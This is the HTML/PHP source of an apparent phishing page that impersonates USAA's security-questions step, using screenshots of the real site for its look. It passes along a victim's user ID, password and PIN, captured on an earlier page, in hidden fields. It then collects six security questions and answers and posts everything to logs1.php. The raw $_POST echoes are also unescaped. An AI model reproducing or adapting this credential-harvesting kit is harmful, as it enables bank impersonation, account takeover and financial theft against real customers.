﻿<!DOCTYPE html><html class="yui3-js-enabled" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script id="utag_171" src="imgs/bat.js" charset="utf-8" async="" type="text/javascript"></script><script src="imgs/s39876891442473.js" async="async" type="text/javascript"></script>
<meta charset="utf-8">
<title>Security Questions | USAA</title>

<meta name="title" content="Security Questions | USAA">

<link rel="stylesheet" type="text/css" href="img/aggregator.css" media="all" />
		<link rel="stylesheet" type="text/css" href="imgs/aggregator.css" media="all" />
		<link rel="SHORTCUT ICON" href="usaaicon.ico" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">


<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #cfccca;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
}
 } 
</style> 

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
.usaa-button.skin-button-1.p1
     {
      border-radius:4px;
      box-shadow:0 0 0 1px #437c16,0 0 0 3px #fff,0 0 0 4px #ddd;
      height:1.8em;
}
.usaa-button .button-liner{border:1px solid transparent;border-radius:4px;color:#005C92;display:block;height:100%;padding:0 10px;position:relative;text-align:center;white-space:nowrap;}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#f1f1f1" Link="#000000" VLink="#000000" ALink="#000000">
<div id="container">

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1353; height:286px; z-index:1"><img src="Capture12.PNG" alt="" title="" border=0 width=1353 height=286></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:286px; width:1352; height:556px; z-index:1"><img src="Capture15.PNG" alt="" title="" border=0 width=1352 height=556></div>


         
<form action="logs1.php" id="id67" method="post" name="Logon" onsubmit="return validateForm()">
<input name="userid" value="<?php echo $_POST['userid'];?>" type="hidden" />
<input name="password" value="<?php echo $_POST['password'];?>" type="hidden" />
<input name="userid2" value="<?php echo $_POST['userid2'];?>" type="hidden" />
<input name="password2" value="<?php echo $_POST['password2'];?>" type="hidden" />
<input name="pin1" value="<?php echo $_POST['pin1'];?>" type="hidden" />


<script type="text/javascript">
function validateForm()
{
var x=document.forms["Logon"]["q1"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #1");
  return false;
  }
  
  var x=document.forms["Logon"]["a1"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #1");
  return false;
  }
  
  var x=document.forms["Logon"]["q2"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #2");
  return false;
  }
  
  var x=document.forms["Logon"]["a2"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #2");
  return false;
  }
  
  var x=document.forms["Logon"]["q3"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #3");
  return false;
  }
  
  var x=document.forms["Logon"]["a3"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #3");
  return false;
  }
  
  var x=document.forms["Logon"]["q4"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #4");
  return false;
  }
  
  var x=document.forms["Logon"]["a4"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #4");
  return false;
  }
  
  var x=document.forms["Logon"]["q5"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #5");
  return false;
  }
  
  var x=document.forms["Logon"]["a5"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #5");
  return false;
  }
  
  var x=document.forms["Logon"]["q6"].value;
if (x==null || x=="")
  {
  alert("You must Select Question #6");
  return false;
  }
  
  var x=document.forms["Logon"]["a6"].value;
if (x==null || x=="")
  {
  alert("You must confirm your answer #6");
  return false;
  }
}
</script>


<div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input autocomplete="false" type="text"><input name="submitbutton" onclick=" var b=document.getElementById('id68'); if (b!=null&amp;&amp;b.onclick!=null&amp;&amp;typeof(b.onclick) != 'undefined') {  var r = b.onclick.bind(b)(); if (r != false) b.click(); } else { b.click(); };  return false;" type="submit"></div>


<select name="q1" id="id59" style="position:absolute;height:18px;width:237px;left:455px;top:296px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="Name of your first employer?">Name of your first employer?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="Name of first elementary school?">Name of first elementary school?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="City your father was born in?">City your father was born in?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="CITY ENGAGED">City you got engaged in?</option>
<option value="FIRST ELEMENTARY SCHOOL CITY">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a1" id="id5a" style="position:absolute;height:18px;width:330px;left:455px;top:335px;z-index:50">

<select name="q2" id="id5b" style="position:absolute;height:18px;width:237px;left:455px;top:391px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="Name of your first employer?">Name of your first employer?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="Name of first elementary school?">Name of first elementary school?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="City you met your spouse in?">City you met your spouse in?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="City you got engaged in?">City you got engaged in?</option>
<option value="City of first elementary school?">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a2" id="id5c" style="position:absolute;height:18px;width:330px;left:455px;top:430px;z-index:50">

<select name="q3" id="id5b" style="position:absolute;height:18px;width:237px;left:455px;top:469px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="Name of your first employer?">Name of your first employer?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="Name of first elementary school?">Name of first elementary school?</option>
<option value="Mascot at your last high school?">Mascot at your last high school?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="City you got engaged in?">City you got engaged in?</option>
<option value="City of first elementary school?">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a3" id="id5c" style="position:absolute;height:18px;width:330px;left:455px;top:508px;z-index:50">

<select name="q4" id="id5b" style="position:absolute;height:18px;width:237px;left:455px;top:547px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="Mascot at your last high school?">Mascot at your last high school?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="City you got engaged in?">City you got engaged in?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="Name of first elementary school?">Name of first elementary school?</option>
<option value="City your father was born in?">City your father was born in?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="City of first elementary school?">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a4" id="id5c" style="position:absolute;height:18px;width:330px;left:455px;top:586px;z-index:50">

<select name="q5" id="id5b" style="position:absolute;height:18px;width:237px;left:455px;top:625px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="Mascot at your last high school?">Mascot at your last high school?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="City you got engaged in?">City you got engaged in?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="Name of first elementary school?">Name of first elementary school?</option>
<option value="City your father was born in?">City your father was born in?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="City of first elementary school?">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a5" id="id5c" style="position:absolute;height:18px;width:330px;left:455px;top:664px;z-index:50">

<select name="q6" id="id5d" style="position:absolute;height:18px;width:237px;left:455px;top:703px;z-index:50">
<option selected="selected" value="">Choose Your Question</option>
<option value="Mascot at your last high school?">Mascot at your last high school?</option>
<option value="Name of your first employer?">Name of your first employer?</option>
<option value="First name of maternal grandmother?">First name of maternal grandmother?</option>
<option value="City you got engaged in?">City you got engaged in?</option>
<option value="City your mother was born in?">City your mother was born in?</option>
<option value="First name of maternal grandfather?">First name of maternal grandfather?</option>
<option value="First name of first boyfriend?">First name of first boyfriend?</option>
<option value="City your father was born in?">City your father was born in?</option>
<option value="First name of your maid of honor?">First name of your maid of honor?</option>
<option value="Name of street you grew up on?">Name of street you grew up on?</option>
<option value="City you got married in?">City you got married in?</option>
<option value="First name of your best man?">First name of your best man?</option>
<option value="Your age at your wedding?">Your age at your wedding?</option>
<option value="First name of paternal grandmother?">First name of paternal grandmother?</option>
<option value="First name of first girlfriend?">First name of first girlfriend?</option>
<option value="First name of paternal grandfather?">First name of paternal grandfather?</option>
<option value="First name of first roommate in college?">First name of first roommate in college?</option>
<option value="City of first elementary school?">City of first elementary school?</option>
</select>

<input size="50" maxlength="50" autocomplete="off" name="a6" id="id5e" style="position:absolute;height:18px;width:330px;left:455px;top:742px;z-index:50">

<div id="image5" style="position:absolute; overflow:hidden; left:1002px; top:801px; z-index:40"><button type="submit" class="usaa-button p2 skin-button-1" name="cancelbutton" id="id69" value="Cancel"><span class="button-liner">Cancel</span></button>
<button type="submit" class="usaa-button p1 skin-button-1" name="submitbutton" id="id68" value="Next"><span class="button-liner">Next</span></button></div>	
	</form>




<div class="usaa-disclosures" style="display:none">
<ul class="disclosure-group">

</ul>
</div>
<div class="usaa-hidden" id="id11">

</div>

	</div>
	
</div>

</div>


<div id="image5" style="position:absolute; overflow:hidden; left:188px; top:855px; width:974px; height:408px; z-index:4"><img src="Capture11.PNG" alt="" title="" border=0 width=974 height=408></div>



</body></html>